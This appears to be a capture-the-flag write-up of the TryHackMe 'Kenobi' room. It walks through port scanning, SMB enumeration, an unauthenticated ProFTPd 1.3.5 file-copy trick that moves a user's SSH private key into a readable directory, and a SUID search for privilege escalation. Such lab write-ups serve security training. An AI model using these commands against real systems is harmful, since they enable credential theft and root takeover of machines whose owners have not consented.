---
title: TryHackMe — Kenobi
date: 2025-02-10
image: /assets/img/telechargement-2.png
categories:
  - TryHackMe
subcategory: Challenges
difficulty: Medium
tags:
  - linux
  - smb
  - proftpd
  - suid
  - path-manipulation
toc: true
---
## Overview

Kenobi is a medium-difficulty TryHackMe room that covers SMB enumeration, ProFTPd exploitation, and SUID privilege escalation.

## Reconnaissance

```bash
nmap -sC -sV -oN nmap/kenobi 10.10.x.x
```

* Port 21 — ProFTPd 1.3.5
* Port 22 — SSH
* Port 80 — Apache
* Port 111 — RPCbind
* Port 139/445 — Samba

## SMB Enumeration

```bash
smbclient //10.10.x.x/anonymous
smbget -R smb://10.10.x.x/anonymous
```

Found `log.txt` containing SSH key path information.

## Exploitation

ProFTPd 1.3.5 allows unauthenticated file copy via `SITE CPFR/CPTO`:

```bash
nc 10.10.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Mount the NFS share and retrieve the key.

## Privilege Escalation

Found a SUID binary:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Used PATH manipulation to escalate to root.

## Lessons Learned

* SMB shares often leak sensitive information
* NFS misconfigurations can expose internal files
* SUID binaries are a common privilege escalation vector on Linux
